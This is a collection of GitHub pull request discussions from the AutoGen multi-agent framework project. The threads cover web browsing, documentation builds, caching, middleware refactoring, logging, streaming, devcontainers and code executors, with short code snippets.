Very interesting PR, and it simulates how a human user (agent) would navigate within the browser.

Quick question: can we have an option to use "BeautifulSoup" to fetch the whole page, without scrolling up and down? Would this make more sense, as ChatGPT or Bing Chat?
author: BeibinLi

body:
> Very interesting PR, and it simulates how a human user (agent) would navigate within the browser.
> 
> Quick question: can we have an option to use "BeautifulSoup" to fetch the whole page, without scrolling up and down? Would this make more sense, as ChatGPT or Bing Chat?

Yes, it's already there. You can access it via `browser.page_content` (rather than `browser.viewport`) . You can see how I use it here: https://github.com/microsoft/autogen/blob/40e3fa5bd68debfe5a199b86e59226a1516a4ca1/autogen/agentchat/contrib/web_surfer.py#L270-L294

You will also note that bing search results are also handled specially, and are never paged: https://github.com/microsoft/autogen/blob/40e3fa5bd68debfe5a199b86e59226a1516a4ca1/autogen/browser_utils.py#L106-L109 (Bing queries are done via:  "bing: hello world")

More generally, I'm not thrilled with paging. There are 2 reasons I do it: (1) It's basically a replication of OpenAI's WebGPT (though I need to re-add "find-in-page", which scrolls to relevant passages. I kept it out of this PR because it was a little messy). And (2), Web Surfing is an extremely fast way to fill up your context window. The page size limits this. If we have better handling of long context throughout the stack, we might need to rely on pagination less (I can handle long context in Web Surfer, but all the other agents is talks too also need to support long context....)

body:
> @olaoluwasalami ,
> 
> First of all, apologies on the delays in reviewing this (travel). This looks really good, thanks for all the work put in!
> 
> One thing I'd like us to discuss a bit more (tradeoffs) is that docusaurus 3 seems to require special character escaping not just in the mdx files, but also in the **docstrings used to automatically generate docs**.
> 
> There are some implications/side effects here:
> 
> * This pr (which should be purely about the website) seems to touch/modify  many of other files outside of the website (e.g. files in oai completions etc).
> * More importantly, there is now a possibility that changes to the core library can break the website unintentionally. (e.g, if docstrings with non-escaped characters are added the website workflow will break).
> 
> @olaoluwasalami (I'd love to hear your thoughts as you have researched this quite a bit) , @skzhang1, @davorrunje what do you think?
> 
> Some potential approaches we can explore include:
> 
> * research ways to automatically escape characters in the docusarus build without requiring developers to write markdown compliant docstrings.
> * This might involve modifying the build process that converts docstrings to markdown such that special characters are (currently uses pydoc-markdown which seems to be designed for docusaurus v2 and is moving to [novella](https://github.com/NiklasRosenstein/pydoc-markdown/issues/277)) . I can help with investigating this too @olaoluwasalami
> 
> Ideally, it would be great to have a solution where docstring updates do not break the website.
> 
> I realize this is creating more work (apologies), but I would like to discuss this to ensure we are fully aware of the side effects. I still think the move to docusaurus v3 is useful (to enable us take advantage of improved templating).

@victordibia can you please check out the solution I found: Docusaurus v3 has an option of processing MD files without the MDX processor (https://docusaurus.io/docs/markdown-features#mdx-vs-commonmark). It means that we can keep everything as it is, there is no need to update docstrings.

Perhaps we can have a separate PR for sanitizing filename generated by LLM?

> This library is useful for sanitizing filename generated by LLM. Although for the purpose of generating a docker tag name, the library doesn't support it -- a post-processing of the filename is still required to make it a valid docker tag name. So for the purpose of fixing #1069 we still need the custom function.
> 
> Perhaps we can have a separate PR for sanitizing filename generated by LLM?

Ah, fair enough! It's just that all that custom sanitization code made me uncomfortable. I've made too many errors in this area in the past, and prefer pre-built libraries for this kind of thing.

It's to the point where I would almost prefer to just generate a random UUID, and use that as the tag.
author: afourney

body: I agree random UUID tag is probably a good idea. Although there is a readability component to it (https://docs.docker.com/engine/reference/commandline/tag/), and the only semantically relevant information about the container in the function is the code and the filename which are both generated by the LLM.
author: ekzhu

body:
> I agree random UUID tag is probably a good idea. Although there is a readability component to it (https://docs.docker.com/engine/reference/commandline/tag/), and the only semantically relevant information about the container in the function is the code and the filename which are both generated by the LLM.

Is there a risk to allowing the llm to name the containers? Will they reuse the same names ever? Is it ok if they do? What is the tradeoff with the other two extremes: Using a fixed tag name that is shared by all calls (e.g., "python:autogen") vs a UUID to guarantee uniqueness?
author: afourney

body: Probably a combination of two? e.g., python:<UUID>_<llm_generated_description>
author: ekzhu

body:
> Is there a risk to allowing the llm to name the containers? Will they reuse the same names ever? Is it ok if they do? 

I think the risk of allowing llm to name the container is at the level of potentially reusing another container that is currently being used by other purpose. It would be okay if it is using a container created earlier for the same or previous iteration of the code. 

To address this we would need to have a concept of a coding session with a container created for the purpose of this session only. Currently the filename is used to identify the session. If the caller does not provide a filename then a hash generated from the code itself is used as a filename. So currently exactly same code may means container reuse. 

> What is the tradeoff with the other two extremes: Using a fixed tag name that is shared by all calls (e.g., "python:autogen") vs a UUID to guarantee uniqueness?

We probably don't want to use the same container for all because each coding session may have different libraries installed and there will be issue with dependency management. We probably want to have uniquely identifiable sessions so iterations of the generated code gets to share the same environment. 

My feeling is that since this PR does not change the expected behavior of the current code, we can design the new code execution logic in a separate PR.

author: afourney

body: I think it might be worthwhile looking into standard solutions for telemetry. One open standard for collecting data is [OpenTelemetry](https://github.com/open-telemetry/opentelemetry-python), which is supported by a range of open and close source solutions such as [honeycomb.io](https://docs.honeycomb.io/getting-data-in/opentelemetry-overview/) and [Prometheus](https://github.com/prometheus/prometheus/pull/12571). Locally, we can use tools such as [otel-desktop-viewer](https://github.com/CtrlSpice/otel-desktop-viewer).
author: davorrunje

body: Hi @davorrunje using OpenTelemetry seems reasonable, this PR is getting close to be ready with the current implementation. I'm planning on get it working with tests first then experiment a bit with OpenTelemetry.
author: cheng-tan

body: I looked at OpenTelemetry earlier, and it seemed a little heavyweight (e.g., we aren't distributed and don't have micro services)-- but maybe our needs have evolved to warrant that. We definitely need *something*. Let's continue with this lightweight SQLite logging, and we can learn our needs as we go.
author: afourney

body: I agree with having a lightweight local implementation such as this. For any kind of server deployment, we need a standard solution like OpenTelemetry. I might make a follow up PR with this very soon.

body: Ok this is streaming output to the terminal, which is great.  However, I have AutoGen behind an API, and I want to stream the output back to the requestor.  How would I do that using your repo?
author: tyler-suard-parker

body:
> Ok this is streaming output to the terminal, which is great.  However, I have AutoGen behind an API, and I want to stream the output back to the requestor.  How would I do that using your repo?

We could easily add a callback to be called, would that work for you?
author: davorrunje

body:
> > Ok this is streaming output to the terminal, which is great.  However, I have AutoGen behind an API, and I want to stream the output back to the requestor.  How would I do that using your repo?
> 
> We could easily add a callback to be called, would that work for you?

I've been doing a lot of work in this area but need to merge it with the latest `main` and this PR. Some important things to consider about callbacks:

- When a callback is called, it should be called with all possible data relating to the request/response, preferably as all keyword arguments.
- The callback function should be called for every chunk and every completed message regardless of whether `stream` is enabled.
- Callbacks can be both sync and async.
- User can specify a `request_id: UUID` when sending messages via user proxy, which will then be passed to the callback function for subsequent responses of agents.
- Each agent should have a unique `agent_id: UUID` which is passed to the callback function.

At least that's how I spec it. My implementation is pretty rough at this point. I've got it working except that my `request_id` doesn't change when I supply a new one yet for some reason. I'm working on it.

And if Chat is always pairwise, how might I implement the equivalent of GroupChat (hub and spoke model / star topology) with this chat primitive?
author: afourney

body:
> First question: Is introducing a new operator necessary? Simpler is better. If there is a way without introducing a new operator, I'd like to know.

I am open to new ideas. 

A quick way to implement this is to add a new option to `register_reply` to allow an Agent type to be accepted, with custom preparation and reflection mechanism registered to the inner Agent. Whether it is easier for the user to understand I am not sure. I would love to hear from users, my opinion is biased.
author: ekzhu

body:
> Where does GroupChat fit in? Supposing we have a sophisticated orchestrator (and not just round-robin), how might I leverage that here? Does it automatically kick-in if Chat() has more than 3 agent parameters? Or is Chat always pairwise? And if Chat is always pairwise, how might I implement the equivalent of GroupChat (hub and spoke model / star topology) with this chat primitive?

Using this design group chat manager is a `ConversableAgent` type so it can be nested in a `Chat`. 

The `Chat` primitive by itself cannot describe all multi-agent interactions. I think we can leverage both:
1. Operators like `Chat` to compose primitives of `Conversable` types to create high-level structures.
2. Built-in primitives like `ConversableAgent` and `GroupChatManager` and custom primitives to implement low-level conversation flows. As long as the primitive implements the `Conversable` interface. 

> A super significant element of https://github.com/microsoft/autogen/pull/890 is that there is a hook that allows agents to consider more than just the last message when converting an inner-chat into a single response

This is an important feature. My current thinking is to expose customization of initiation message and response preparation through `Chat` operator

body:
I agree with Davor. Declaring the context for caching separately from the llm_config is a good idea. We may want to refactor llm_config as it starts to feel unmanageable with non-openai models. 

I would not worry about forcing a unified configuration interface for all different cache providers, but I would keep all of them  under the same entry point. Here is what I mean:

```python

with cache.redis(url="...", **other parameters):
   a.initiate_chat(...)


with cache.disk(cache_seed=41, ...):
   a.initiate_chat(...)

with cache.sqlite(connection_string="..."):
   a.initiate_chat(...)

```

As you can see all future cache providers can be called from a single entrypoint `cache`. My reason for this is that in the future we may want to have other context managers and keeping it hierarchical helps with not confusing them. It also helps with auto-complete.  

To avoid breaking backward compatibility we can keep the `cache_seed` in the `llm_config` for now, and only enable it for diskcache. But for every other cache provider we can use the context manager interface or setup functions (or both!). In the future after we have finished refactoring `llm_config` we can then put in deprecation notice.

author: sonichi

body:
> Is this specific to the redis cache or also to disckcahe?

Redis cache and disk cache have different behaviors after being closed:
1. Attempt to use the Redis cache connection after it has been closed will results in error.
2. Attempt to use the DiskCache's  Cache after it has been closed will re-open the cache and won't results in error. 

So, we will see weird behavior after the context exits for these two caches:

```python
with Cache.redis(..) as cache:
  agent.initiate_chat(b, ..., cache=cache)

# This will results in error. as the cache has already been closed.
agent.generate_reply(...)
```

```python
with Cache.disk(..) as cache:
  agent.initiate_chat(b, ..., cache=cache)

# This will be fine, but the cache is still used.
agent.generate_reply(...)
```

My thinking is that the cache should detaches itself from every agent instances once it exits the `with` context. 

## Update

After testing myself. I was incorrect to say the redis cache will raise an error if attempts to use it after close(). In fact both code above will be fine.

body:
This is exactly what I had in mind, but after sleeping over it I think the decision on what API style to use should be based on the `api_type` and `api_version` parameters in `llm_config`.  E.g. this is what the `llm_config` looks like for the Azure OAI endpoint:
```python
oia_config_list = [
    {
        "model": "gpt-4",
        "api_key": "************************",
        "base_url": "https://something.openai.azure.com",
        "api_type": "azure",
        "api_version": "2023-12-01-preview"
    },
]
```
The best way to implement this IMO would be to delegate the responsibility of adjusting the `llm_config` passed to the OAI wrapper to classes constructed from the initial `llm_config`. That way we could handle many subtle differences between API versions, not just this. The user-defined code would always stay the same, we would handle new API versions internally. We could also add `api_style` for Mistral, Llama etc. which might have some slight differences now or in the future.

We should close this PR and makes it into an issue if that’s what we want to do.

body:
This starts to resemble more and more like middleware pattern: https://learn.microsoft.com/en-us/aspnet/core/fundamentals/middleware/?view=aspnetcore-8.0

![](https://learn.microsoft.com/en-us/aspnet/core/fundamentals/middleware/index/_static/middleware-pipeline.svg?view=aspnetcore-8.0)

See the diagram above. Each request gets processed by a chained pipeline of middlewares. Each middleware does some work based on the message and current application state, and decides whether to pass control to the next one or "short-circuit" back to the previous one. 

We can also use this design pattern to model our Conversable Agent, and I think it accurate describes how our agent currently behaves.

A simple LLM-based agent contains the following middlewares in order:

1. Handles terminations (counter-based termination, message-based termination, and others) -- this is like a short-circuit middleware which returns before anything else is made.
2. Message manipulation, i.e., for OPENAI message, we need to change the "role" key to "user" to fake a user message.
3. Message augmentation. i.e., augment relevant context for each message by doing RAG-style retrieval. Teachability and memory can be considered this way. 
4. Bookkeeping, storing and logging incoming and outgoing messages. 
5. Each generate_reply method is a middleware as each of them gets triggered and decides whether to pass control to the next one. If it decides to short-circuit, the rest of the reply methods will be skipped.

Not coming from strong Python background so don't want to overly stress my opinion here.
Still - As I read this PR conversations, and hanging around the relevant existing code in the repo for a while I feel like "override anything you want" approach would generate a problem in the other directions.

Here is how I see it - at the moment even for replacing a simple reply you have to work pretty hard - but at least it's clear what are the customizable parts of an agent. Or in other words, when does an "agent" is no longer a agent.

Basically, I love this PR direction of using an already established method for extending and mixing in new behavior. I also all for deduplicating the async specific code as much as possible.
But - there should always be a clear vision of what are the ways this could be done and in which points. Otherwise maintaining a strong backward compatible API (which means user base can keep upgrading without forking, abandoning) will be almost impossible.
Same goes for documentation - showing 100 possible ways of doing the same thing would confuse new users and reduce adoption rate.

I would suggest:
- Recognize from known use cases in the wild how do users WANT to extend and customize the library today. (not in a distant future)
- Design this extensibility looking into a future of endless variations on the above use cases (not other use cases)
- Look for an established Pythonian way this shoudl be done
- Hopefully find a backward compatible way of weaving that in without breaking exiting API

Hope this help, thank you so much for your work!

body:
To ground our discussion of refactorization, here's a summary of the hook-based process (introduced by #1091) that was used to refactor teachability into a composable, chainable capability for addition to any agent. This hook process involves three mechanisms: **Capability addition**, **Hook registration** and **Hook execution**: | Mechanisms | Agent objects and methods | Capability objects and methods | | --- | --- | --- | | **Capability addition**
extends an agent. | The app instantiates an agent, like
`agent = ConversableAgent()`
or one of its subclasses. | The app instantiates a capability, like
`teachability = Teachability()` then calls
`teachability.add_to_agent(agent)`. | | **Hook registration**
connects a
hook method to a
hookable method. | `ConversableAgent` implements
and calls hookable methods, like
`ConversableAgent.process_last_message()`.

`ConversableAgent` implements
`ConversableAgent.register_hook(`
      `hookable_method, hook)`. | The capability implements
hook methods, like
`Teachability.process_last_message()`.

`Teachability.add_to_agent(agent)` calls
`agent.register_hook(`
      `hookable_method, hook)`. | | **Hook execution** | `ConversableAgent` methods call its
hookable methods, which call
their registered hook methods (if any). | Capability hook methods are called by
their registered hookable methods. |

body:
## Update 01/18/2024

Middleware registration methods `add_middleware` and `set_middleware` are refactored to be attached to bounded methods as suggested by @LittleLittleCloud and @ekzhu. 

```python
class A:
    def __init__(self, name: str) -> None:
        self.name = name

    @register_for_middleware
    def process_message(self, msg: str, skip_middleware: Optional[bool] = None) -> str:
        return f"{self.name}.process_message({msg=})"

class MyMiddleware:
    def __init__(self, name: str) -> None:
        self.name = name

    def call(self, *args: Any, next: Callable[..., Any], **kwargs: Any) -> str:
        retval = next(*args, **kwargs)
        return f"{self.name}.{format_function(self.call, retval)}"

    def trigger(self, *args: Any, **kwargs: Any) -> bool:
        return not ("skip_middleware" in kwargs and kwargs["skip_middleware"])

a = A("a")
mw = MyMiddleware("mw")

# middleware attached to a bounded method a.process_message
add_middleware(a.process_message, mw)

assert a.process_message("hello") == "mw.call(a.process_message(msg='hello'))"

mw2 = MyMiddleware("mw2")
add_middleware(a.process_message, mw2)
assert a.process_message("hello") == "mw.call(mw2.call(a.process_message(msg='hello')))"

b = A("b")
with pytest.raises(ValueError):
    # mw is already attached to a.process_message
    add_middleware(b.process_message, mw)

mwb = MyMiddleware("mwb")
add_middleware(b.process_message, mwb)

# only mwb middleware is called on calling b.process_message
assert b.process_message("hello") ==  "mwb.call(b.process_message(msg='hello'))"

# only mw and mw2 are called on a.process_message
assert a.process_message("hello") ==  "mw.call(mw2.call(a.process_message(msg='hello')))"
```

body:
## Update 01/19/2024

The code was internally refactored so it accurately uses the signature of a decorated function in call() methods of a MIddleware class. Another change is adding the `a_call` method to `Middleware` classes and removing of `trigger` method. Having both `call()` and `a_call` allows for the most efficient implementation. Decorators for automatically generating `call` from `a_call` and vice versa will be added shortly so we'll be still able to mix sync/async styles if we are willing to pay the price in reduced performance. Examples of `Middleware` classes were added to the `ConversableAgent`. Here is a simple one performing logging:
```python
# notice that the `call`` signature must match the function decorated with `register_for_middleware`:
# passing arguments to call() functions must the the same as passing arguments
# to generate_reply() apart from next being passed as a keyword argument
# default values must also be the same
class _PrintReplyMiddleware:
    def __init__(self, agent: Agent):
        self._agent = agent

    def call(
        self,
        messages: Optional[List[Dict]] = None,
        sender: Optional[Agent] = None,
        # next will be passed as a keyword argument
        next: Optional[Callable[..., Any]] = None,
    ) -> Tuple[bool, Optional[str]]:
        print(f"generate_reply() called: {sender} sending {messages[-1] if messages else messages}'")
        retval = next(messages, sender)
        return retval
    
    async def a_call(
        self,
        messages: Optional[List[Dict]] = None,
        sender: Optional[Agent] = None,
        next: Optional[Callable[..., Any]] = None,
    ) -> Tuple[bool, Optional[str]]:
        print(f"a_generate_reply() called: {sender} sending {messages[-1] if messages else messages}'")
        retval = await next(messages, sender)
        return retval

class ConversableAgent(Agent):
    def __init__(self, *args, **kwargs):
        ...
        # attaching middleware to a registered method 
        add_middleware(self.generate_reply, _PrintReplyMiddleware(self))
        add_middleware(self.a_generate_reply, _PrintReplyMiddleware(self))

    @register_for_middleware
    def generate_reply(
        self,
        messages: Optional[List[Dict]] = None,
        sender: Optional[Agent] = None,
        exclude: Optional[List[Callable]] = None,
    ) -> Union[str, Dict, None]:
        ...

    @register_for_middleware
    async def a_generate_reply(
        self,
        messages: Optional[List[Dict]] = None,
        sender: Optional[Agent] = None,
        exclude: Optional[List[Callable]] = None,
    ) -> Union[str, Dict, None]:
        ...

```
All the tests are passing and we are ready to start refactoring the `ConversableAgent` class.

author: ekzhu

body:
Currently in AutoGen, each incoming message is handled by a pipeline of registered reply functions. Each reply function is triggered by a trigger function. If a reply function is triggered and signaled it is a `final` reply, it short-circuits the pipeline and returns the generated reply back to the sender. 

This design pattern is described in the AutoGen paper (https://arxiv.org/pdf/2308.08155.pdf, Section 2). This PR is a refactor, we convert reply function into middleware class, so it can better handle states like code executors, message history, etc.

body: @Tylersuard as @ekzhu said, the idea was to refactor the code using a well-known Middleware pattern instead of a  currently used ad-hoc mechanism with reply functions. The Middleware pattern was explored here because of its popularity in frameworks such as Starlette (https://www.starlette.io/middleware/) and FastAPI (https://fastapi.tiangolo.com/tutorial/middleware/) where it is the standard way of extending the framework by non-experts. The main idea is to have a self-contained Middleware class that can be independently tested and then integrated with other middleware functions to implement a required combination of functionalities. E.g. if you wish to add observability to your agents using OpenTelemetry, you would only need to implement a Middleware subclass and attach it to an Agent. As I said, that is a well-known and battle-proven mechanism in the most popular frameworks used by millions of junior and mid-level developers. Implementation of the mechanism is not the simplest one, but using it is easier than using the mechanism with reply functions available today.

body: I think your code is a correct bug fix, but not for #1205 (it is about 2 calls suggested in the same response).
author: davorrunje

body:
My understanding is the failure in #1205 is due to one func being sync and the other being async while running in async mode.

In single function calling, it doesn't matter because both sync and async reply methods are called and only one will pick up a single function call.

However in multi tool calling, async picks up the tool request and responds with the async funcs result. In existing code, async would not fulfill the request for the sync method because it would ignore the sync method. Because it does have a result for the async method, the sync reply handler is never called. Thus async tool handler has to execute sync tool requests to be able to return both async and sync results together.

Once OpenAI stopped giving me 500s I was able to confirm the notebook runs successfully, ran multiple times with clearing cache. However the output of the notebook doesn't show enough to be certain it was done with parallel tool calls.

body:
I think this PR is fine as it is. Though I would consider moving toward a design pattern of minimizing intermediate states. E.g., accumulator for costs and tokens, as those can be computed directly if you have the complete history of OpenAI responses of this conversation. Keeping intermediate states and throwing away the original data can lead to many hard to trace bug as you don't have the original data to verify. Also, having the original data can enable many diagnostic and analytic features in the future. 

I would consider looking at this PR #1222 as an example (or a starting point), and consider create a diagnostic context to enable features like cost estimation, LLM API latency stats, LLM API usage logging, etc. 

```python

diagnostic.start()
 
a.initiate_chat(b)

diagnostic.usage()

diagnostic.end()

diagnostic.summary()
```

Something similar.

body:
> Wait , how does this work for agents like GroupChatManager or agents that are enabled as Teachable? These agents make additional LLM calls outside the usual flow.

Thanks for the comment!
GroupChatManager inherits Conversable_agent, so the print_usage_summary and gather_usage_summary works for it.
But you are right for agents that doesn't follow a usual flow. If there are additional flow defined inside an agent, the user need to take them out explicitly to pass to `gather_usage_summary`. This still doesn't work if there are additional client defined. For example, Compressible_Agent has a `self.client` and a `self.compress_client`, where this method doesn't count for self.compress_client. 

Based on these observations, I am considering the following changes for this PR:
- remove the `Agent.print_usage_summary()`, `Agent.get_actual_usage()` and `Agent.get_total_usage()`, as they may not reflect real usage by the agent. 
- only add a `gather_usage_summary_from_clients` utility function. We explicitly ask users to collect all the defined `OpenAIWrapper` instance from agents

In the next step, maybe we can provide an abstract class method in `conversable_agent` for users to register additional usage. (and for our existing Contrib Agents), then we can add back `Agent.print_usage_summary()`, `Agent.get_actual_usage()` and `Agent.get_total_usage()`, and usage collection for agents.

This is a great addition. I am trying to get a good understanding of the design.

1. Is this aiming to move agent-to-agent communication on to websocket/streaming? There is a parallel effort on this front from #1289 
2. To handle printing to a stream, could this be done with a special logging middleware as proposed in the middleware design in #1240?
author: ekzhu

body:
> This is a great addition. I am trying to get a good understanding of the design.
> 
> 1. Is this aiming to move agent-to-agent communication on to websocket/streaming? There is a parallel effort on this front from [Add RemoteAgent and Receiver #1289](https://github.com/microsoft/autogen/pull/1289)

Thanks! I'm glad you're excited by it too.

@ragyabraham please feel free to add.

I think the fundamental difference to #1289 is that here, we're not trying to move the agent-to-agent message transmission to socket, nor have an Agent hosted elsewhere. If my understanding is correct 
`jacks_cal = RemoteAgent("jacks_cal", host="localhost", port=45554)`
means that `jacks_cal` can be hosted at another IP address. This PR is not concerned with that. Instead, this PR is about emitting messages of what each Agent said onto the socket, so that another front-end tool can display it and not for the purpose of sending it to another agent. In our use case, the front-end is a web browser, there seems to be another use case of displaying it in Teams in #1199.




> 2. To handle printing to a stream, could this be done with a special logging middleware as proposed in the middleware design in [Refactorization study with design patterns (was refactorization of hooks) #1240](https://github.com/microsoft/autogen/pull/1240)?

I think so, however, I'm not very familiar with hooks, and would need to work with you or @davorrunje to iterate on how to implement it properly through the reviews. If there's any tips anyone can share before we start developing, that might help reduce reviews/rework! :)
author: joshkyh

Certainly! I am here to make sure us don't have to redo a lot of work. I am just thinking if #1240 go through first, it will be much easier for us to implement something like logging and emitting to a frontend.

author: Tylersuard

body:
@Tylersuard Thanks for your interest. This is surely a feature we hope to have but don't have cycle to work on. If you are interested, you can take a look at it. A good place to start is in the `conversable_agent.py` file, in the method `generate_reply`. Before the reply message gets sent out you can intercept there and add an async write to a stream, which can be passed in as part of the constructor. 

#1240 will refactor `ConversableAgent` to make this type of extension very easy to do. i.e., it will be a middleware class that you put inside `ConversableAgent`. You can also choose to work from that branch.

> @gagb revised relevant documentation needed because of the cleanup. For the base image, Davor's suggestion for using the VS code-optimized one sounds good to me. But I haven't changed that. I tried `mcr.microsoft.com/devcontainers/python:3.11`. Working well so far.

What's the reason to shift to 3.11 image when current is using 3.10?

Also I locally built our primary base Dockerfile i.e., `.devcontainer/Dockerfile`
```
docker build -f .devcontainer/Dockerfile -t autogen_main .
docker run -it -p 8081:3000 -v `pwd`:/autogen autogen_main bash
# inside the container
cd /autogen
sudo pip install -e .  # without sudo I get an error installing (see below)
```

Given that this works, what is the utility of `.devcontainer/base/`. 
This example shows that our primary base is compatible with both vscode, Codespaces, and local dev.
I am not an expert so please double check my arguments. (cc @qingyun-wu, @davorrunje)


#### Error if sudo isn't specified.
```
ERROR: pip's dependency resolver does not currently take into account all the packages that are installed. This behaviour is the source of the following dependency conflicts.
databind-json 4.4.2 requires typing-extensions<4.7,>=3.10.0, but you have typing-extensions 4.9.0 which is incompatible.
databind-core 4.4.2 requires typing-extensions<4.7,>=3.10.0, but you have typing-extensions 4.9.0 which is incompatible.
```



#### My suggestion:
- delete `.devcontainer/base` and only provide primary base. Update `.devcontainer/README.md`
- merge and create a separate issue that updates `dev` and `full` to use a different base image
- double-check instructions in `Contribute.md`
author: gagb

body:
I removed `.devcontainer/base`
`dev` and `full` can be updated to use different base images in a separate PR -- this change isn't blocking anyone.
author: gagb

body: I am not sure about moving additional directories under `.devcontainer`. As far as I understand, and I don't know much about it, VS Code uses `.devcontainer/devcontainer.json` to start a docker container specified in it when you run it. That's actually how I use it and it works very well. I don't really know how to start VS Code with alternative Docker images without changing `.devcontainer/devcontainer.json`, which is a file tracked by git and should be used for local configuration. Of course, it makes sense to use other containers in different circumstances, but maybe `.devcontainer` is not a good place for them.

body:
I like this PR a lot! I don't have any comments for the Client class, which is flexible and easy to work with.

However, I am concerned about the "AutoModelForCausalLM" in the notebook example.

(Please correct me if I am wrong).
It usually takes minutes (sometimes > 5 minutes) to load a model, which means testing a very simple code would take so long to just initiate the client object.  In this case, if users made a small bug in their agent, the code might crash, and they need to restart the whole process again. 

So, it is usually better to start a host and let the client to communicate with the host. If the users made small typos in their agent code, they just need to restart the agent code (usually < 3 seconds). 

Or, we can just simply tell the users (in the notebook) that this client might be expensive to load.

body:
@ekzhu @sonichi please see again how client registration is happening:

- config list has to have `"api_type": "CustomClassName"` (easier to filter by specific class)
- during construction of agents a `PlaceHolderClient` is registered in the place of the custom client in the config (removes the need for "activated" field)
- during registration `agent.register_model_client(model_client_cls=CustomClassName)` we replace the placeholder object with the custom client
- when a chat is initialized we check that all placeholders have been replaced, and if not we raise an error



Also: simplified the client response protocol and added a function so that the custom client writer can decide how to retrieve the message from the response, allowing more flexibility

body: As a dev, I am not sure I fully understand what will be chat history of each agent with the introduction of takeaway and carry over method. Which methods alter the history? Which don't?
author: gagb

body:
> As a dev, I am not sure I fully understand what will be chat history of each agent with the introduction of takeaway and carry over method. Which methods alter the history? Which don't?

None of the takeaway methods alter the history of the current chat. They will just take current history as input and try to get a takeaway as output at the end of the chat. 

The takeaway from a chat will be used as a carryover in subsequent chats. They will alter the first message in subsequent chats:  The carryover will be added as additional context at the end of the first message in a chat. It is done in `generate_init_message`.

body: I'm not sure why with the recent 0.2.8 change why we need to default to using docker. I thought the default was to not use docker.
author: rlam3

body:
> I'm not sure why with the recent 0.2.8 change why we need to default to using docker. I thought the default was to not use docker.

Running in Docker was always our recommendation -- it's *so much safer* when dealing with the arbitrary code these agents write. Previously, we printed a prominent warning to console when Docker wasn't explicitly disabled with `use_docker=False` -- I wrote that PR myself in #172, which was one of my first contributions to AutoGen. 

The change in 0.2.8 is to elevate the recommendation to a default. But, you can easily opt-out setting use_docker to false or setting the global environment variable.
author: afourney

body:
@afourney H

> I like this idea very much.
> 
> Given that we use the markdown header to specify language, should be allow executor to be a dictionary?
> 
> ```
> {
>     "executor": {
>         "python": notebook_executor,
>         "sh": terminal_executor,
>         "typescript": ts_executor,
>         "c#": c_sharp_executor
>    },
>    ...
> }
> ```

Thanks. This is actually an interesting idea that the dictionary entry could be an instance of an executor to achieve customization. Though currently we assume the code executor is supposed to be language agnostic -- as the LLM could produce code in multiple languages and we assume those will be executed in the same environment. So, the code executor is more about the environment in which the code runs. E.g., a command line environment which supports command utilities, an ipython environment that only supports ipython commands (python code and stuff like `! pip install package`.) 

We can also introduce Google Code Lab environment and .NET interactive (shout out to @LittleLittleCloud @colombod) in the future. For now, I am expecting mostly community contributions on these cases. Each executor can put in their configuration parameters inside the `code_execution_config`:

```python
{"executor": "ipython",
  "ipython": {
    "timeout": 50,
    "preload_modules": ["numpy", "pandas", ...],
  }
}
```

author: gagb

body:
@gagb 

> Is there a reason to use `output_dir` vs `work_dir` for iPython and command line, resp?

For IPython executor, the `output_dir` is a write-only directory for saving images and HTML outputs that would normally get displayed through a Jupyter Notebook frontend. Because most models cannot support multi-modality so for now we do not include large data output in the code result message -- but we can make this optional and configurable through the code executor's constructor in the future.

For the command line executor, the `work_dir` is a read-and-write directory for saving code files and execute code files. It is also used for execution results if any depending on the generated code. 

So, `work_dir` for read-and-write, `output_dir` for write-only.

body:
This feature adds a great enhancement to code generation and execution capabilities, good job!

Before diving into more detailed feedback, I have a high-level question regarding the architectural design: the code executor is situated within the user_proxy, but the capability is being granted to the agent. The separation of responsibilities and flexibility offered here (allowing the agent to interact with various user_proxy configurations without modifying the agent?) is insightful. However, this design choice does prompt some initial curiosity. Could you elaborate on the rationale behind assigning the execution capability to user_proxy and then extending this capability to the agent?

```
user_proxy = UserProxyAgent(name="proxy", code_execution_config={"executor": "ipython-embedded", "ipython-embedded": {"output_dir": "coding_output"}})

agent = ConversableAgent("agent", ...)
user_proxy.code_executor.user_capability.add_to_agent(agent)
```
author: IANTHEREAL

body:
@IANTHEREAL 

> Could you elaborate on the rationale behind assigning the execution capability to user_proxy and then extending this capability to the agent?

The agent writing the code (producer agent) needs to be updated with instruction on how to use the code executor, as different code executors might have:
- different execution environment
- accepted languages
- different expectation of code formatting: markdown code block is only one type.

For example, the instruction on how to use the command line code executor is quite different from the ipython executor. In the future, we will also support compiled languages like Go, Rust and C#. In those cases, the instruction could be asking the code producer to write multiple files, run a compilation command, and then execute the compiled binary. 

The `add_to_agent` is a binding function that binds the code executor with the producer agent. Assigning the code executor to the proxy agent is another binding that binds the code executor with the executor agent. As the next step, we build on top of this and create various high-level & user-facing "multi-way" binding functions that bind multiple producer and executor agents to a code executor. For example, docker container is a heavy resource and it is associated and managed by one executor. We can share this resource by binding the code executor to many agents to share it among them and allow them to collaborate in the same workspace.
author: ekzhu
IANTHEREAL

body:
> Is there a way to bind both the code producer agent and the code executor agent to a single agent entity?
> 
> Additionally, injecting code executor information into the agent system via add_to_agent could potentially increase the complexity of tuning prompts (system messages), requiring coordination in two places to adjust the prompt. I believe it's important to highlight this aspect in the documentation, as we all know how crucial prompts are for LLM agents.

I think you brought up a great point. We can probably expose the instruction string in the user capability as a parameter in the executor.

body:
Thanks for the PR! Here is my comment originally posted inline but moved here. 

websocket is only one possible implementation of this streaming feature. As a framework we want to make this general.

So, you can first define a `StreamingHandler(Protocol)` protocol (Python speak for Interface) in a separate streaming module, and write a wrapper class that implements the `StreamingHandler(Protocol)` using the websocket library you are using here. 

When user use it, they can pass in a `StreamingHandler` instance. 

Check out `cache` module for example. What you are doing here is very similar to that.

body: Hi @m-carter1, I modified AutogenStudio's code myself to use PostgreSQL instead of sqlite, one thing to note is that PostgreSQL is stricter with JSON structures compared to SQLite. For instance, in the workflows table, the sender and receiver fields may encounter issues during retrieval if the JSON structure deviates even slightly due to its growing complexity (single quote/double quote, new line, some symbol not being properly escaped, etc.). It will work fine with sqlite but not with postgreSQL, at least in my case. In order to fix it, you might have to touch upsert_ functions in dbutils to make sure what you inserted is 100% clean formattable json structure. Hope it helps.

Thanks for your contributor @jtrugman .

I'm inspired by your contribution! It sparked a new idea—what if we added specific functions like `updateTools/getTools` and `updateInstruction/Instruction` to handle these configurations? This could potentially:

- Allow more flexible dynamic updates 
- Provide a clear interface for users to interact with the assistant's settings.

What are your thoughts on this suggestion?

body:
@jtrugman After looking at your test cases, I realized that getTools might be quite useful. It seems necessary to check the current state before updating tools, which is where my idea comes from. 

